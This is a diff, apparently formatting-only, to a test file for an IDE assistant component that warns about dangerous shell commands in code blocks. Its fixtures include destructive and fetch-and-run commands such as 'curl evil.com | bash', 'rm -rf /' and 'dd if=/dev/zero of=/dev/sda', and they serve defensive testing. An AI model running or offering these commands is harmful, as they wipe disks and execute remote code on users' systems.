@@ -35,17 +35,21 @@ const mockIdeMessenger = {
 const createMockStore = () => {
   return configureStore({
     reducer: {
-      session: (state = {
-        history: [],
-        isStreaming: false,
-        codeBlockApplyStates: {
-          curIndex: 0,
-          states: [],
+      session: (
+        state = {
+          history: [],
+          isStreaming: false,
+          codeBlockApplyStates: {
+            curIndex: 0,
+            states: [],
+          },
         },
-      }) => state,
-      toolCalls: (state = {
-        toolCalls: {},
-      }) => state,
+      ) => state,
+      toolCalls: (
+        state = {
+          toolCalls: {},
+        },
+      ) => state,
     },
   });
 };
@@ -71,7 +75,7 @@ const renderComponent = (props = {}) => {
       <IdeMessengerContext.Provider value={mockIdeMessenger as any}>
         <StepContainerPreToolbar {...defaultProps} {...props} />
       </IdeMessengerContext.Provider>
-    </Provider>
+    </Provider>,
   );
 };
 
@@ -79,49 +83,49 @@ describe("StepContainerPreToolbar Security Warnings", () => {
   describe("Dangerous commands should show warning", () => {
     it("should show warning for rm -rf command", () => {
       renderComponent({ codeBlockContent: "rm -rf /" });
-      
+
       const warning = screen.getByText(/potentially dangerous commands/i);
       expect(warning).toBeInTheDocument();
     });
 
     it("should show warning for sudo command", () => {
       renderComponent({ codeBlockContent: "sudo apt install malware" });
-      
+
       const warning = screen.getByText(/potentially dangerous commands/i);
       expect(warning).toBeInTheDocument();
     });
 
     it("should show warning for chmod 777 command", () => {
       renderComponent({ codeBlockContent: "chmod 777 /etc/passwd" });
-      
+
       const warning = screen.getByText(/potentially dangerous commands/i);
       expect(warning).toBeInTheDocument();
     });
 
     it("should show warning for curl pipe to bash", () => {
       renderComponent({ codeBlockContent: "curl evil.com | bash" });
-      
+
       const warning = screen.getByText(/potentially dangerous commands/i);
       expect(warning).toBeInTheDocument();
     });
 
     it("should show warning for wget pipe to sh", () => {
       renderComponent({ codeBlockContent: "wget malicious.site | sh" });
-      
+
       const warning = screen.getByText(/potentially dangerous commands/i);
       expect(warning).toBeInTheDocument();
     });
 
     it("should show warning for mkfs command", () => {
       renderComponent({ codeBlockContent: "mkfs.ext4 /dev/sda1" });
-      
+
       const warning = screen.getByText(/potentially dangerous commands/i);
       expect(warning).toBeInTheDocument();
     });
 
     it("should show warning for dd command writing to device", () => {
       renderComponent({ codeBlockContent: "dd if=/dev/zero of=/dev/sda" });
-      
+
       const warning = screen.getByText(/potentially dangerous commands/i);
       expect(warning).toBeInTheDocument();
     });
@@ -130,9 +134,9 @@ describe("StepContainerPreToolbar Security Warnings", () => {
       const codeWithComments = `# This is a comment
 sudo rm -rf /important
 # Another comment`;
-      
+
       renderComponent({ codeBlockContent: codeWithComments });
-      
+
       const warning = screen.getByText(/potentially dangerous commands/i);
       expect(warning).toBeInTheDocument();
     });
@@ -141,49 +145,49 @@ sudo rm -rf /important
   describe("Safe commands should not show warning", () => {
     it("should not show warning for ls command", () => {
       renderComponent({ codeBlockContent: "ls -la" });
-      
+
       const warning = screen.queryByText(/potentially dangerous commands/i);
       expect(warning).not.toBeInTheDocument();
     });
 
     it("should not show warning for git status", () => {
       renderComponent({ codeBlockContent: "git status" });
-      
+
       const warning = screen.queryByText(/potentially dangerous commands/i);
       expect(warning).not.toBeInTheDocument();
     });
 
     it("should not show warning for npm run test", () => {
       renderComponent({ codeBlockContent: "npm run test" });
-      
+
       const warning = screen.queryByText(/potentially dangerous commands/i);
       expect(warning).not.toBeInTheDocument();
     });
 
     it("should not show warning for pwd command", () => {
       renderComponent({ codeBlockContent: "pwd" });
-      
+
       const warning = screen.queryByText(/potentially dangerous commands/i);
       expect(warning).not.toBeInTheDocument();
     });
 
     it("should not show warning for cat command", () => {
       renderComponent({ codeBlockContent: "cat file.txt" });
-      
+
       const warning = screen.queryByText(/potentially dangerous commands/i);
       expect(warning).not.toBeInTheDocument();
     });
 
     it("should not show warning for grep command", () => {
       renderComponent({ codeBlockContent: "grep 'pattern' file.txt" });
-      
+
       const warning = screen.queryByText(/potentially dangerous commands/i);
       expect(warning).not.toBeInTheDocument();
     });
 
     it("should not show warning for echo command", () => {
       renderComponent({ codeBlockContent: "echo 'Hello World'" });
-      
+
       const warning = screen.queryByText(/potentially dangerous commands/i);
       expect(warning).not.toBeInTheDocument();
     });
@@ -191,21 +195,21 @@ sudo rm -rf /important
 
   describe("Edge cases", () => {
     it("should detect dangerous commands in sh language", () => {
-      renderComponent({ 
+      renderComponent({
         codeBlockContent: "sudo rm -rf /",
-        language: "sh" 
+        language: "sh",
       });
-      
+
       const warning = screen.getByText(/potentially dangerous commands/i);
       expect(warning).toBeInTheDocument();
     });
 
     it("should detect terminal commands without language specified", () => {
-      renderComponent({ 
+      renderComponent({
         codeBlockContent: "ls -la",
-        language: undefined 
+        language: undefined,
       });
-      
+
       // ls is a common terminal command that's safe
       const warning = screen.queryByText(/potentially dangerous commands/i);
       expect(warning).not.toBeInTheDocument();
@@ -216,26 +220,26 @@ sudo rm -rf /important
 ls -la
 sudo rm -rf /tmp/test
 echo "Done"`;
-      
+
       renderComponent({ codeBlockContent: multiLineScript });
-      
+
       const warning = screen.getByText(/potentially dangerous commands/i);
       expect(warning).toBeInTheDocument();
     });
 
     it("should not show warning for non-terminal code blocks", () => {
-      renderComponent({ 
+      renderComponent({
         codeBlockContent: "const dangerous = 'rm -rf /'",
-        language: "javascript" 
+        language: "javascript",
       });
-      
+
       const warning = screen.queryByText(/potentially dangerous commands/i);
       expect(warning).not.toBeInTheDocument();
     });
 
     it("should handle empty code blocks", () => {
       renderComponent({ codeBlockContent: "" });
-      
+
       const warning = screen.queryByText(/potentially dangerous commands/i);
       expect(warning).not.toBeInTheDocument();
     });
@@ -244,9 +248,9 @@ echo "Done"`;
       const onlyComments = `# This is a comment
 # Another comment
 # Yet another comment`;
-      
+
       renderComponent({ codeBlockContent: onlyComments });
-      
+
       const warning = screen.queryByText(/potentially dangerous commands/i);
       expect(warning).not.toBeInTheDocument();
     });
@@ -255,25 +259,34 @@ echo "Done"`;
   describe("Warning UI elements", () => {
     it("should display warning with correct styling", () => {
       renderComponent({ codeBlockContent: "sudo rm -rf /" });
-      
-      const warningContainer = screen.getByText(/potentially dangerous commands/i).parentElement;
-      expect(warningContainer).toHaveClass("bg-warning/10", "border-warning/30", "text-warning");
+
+      const warningContainer = screen.getByText(
+        /potentially dangerous commands/i,
+      ).parentElement;
+      expect(warningContainer).toHaveClass(
+        "bg-warning/10",
+        "border-warning/30",
+        "text-warning",
+      );
     });
 
     it("should display exclamation triangle icon with warning", () => {
       renderComponent({ codeBlockContent: "sudo rm -rf /" });
-      
+
       // Check for the icon by looking for its container with the warning
-      const warningContainer = screen.getByText(/potentially dangerous commands/i).parentElement;
-      const icon = warningContainer?.querySelector('svg');
+      const warningContainer = screen.getByText(
+        /potentially dangerous commands/i,
+      ).parentElement;
+      const icon = warningContainer?.querySelector("svg");
       expect(icon).toBeInTheDocument();
       expect(icon).toHaveClass("h-4", "w-4");
     });
 
     it("should display full warning message", () => {
       renderComponent({ codeBlockContent: "sudo rm -rf /" });
-      
-      const expectedMessage = "This code contains potentially dangerous commands. Please review and understand the code before running.";
+
+      const expectedMessage =
+        "This code contains potentially dangerous commands. Please review and understand the code before running.";
       const warning = screen.getByText(expectedMessage);
       expect(warning).toBeInTheDocument();
     });
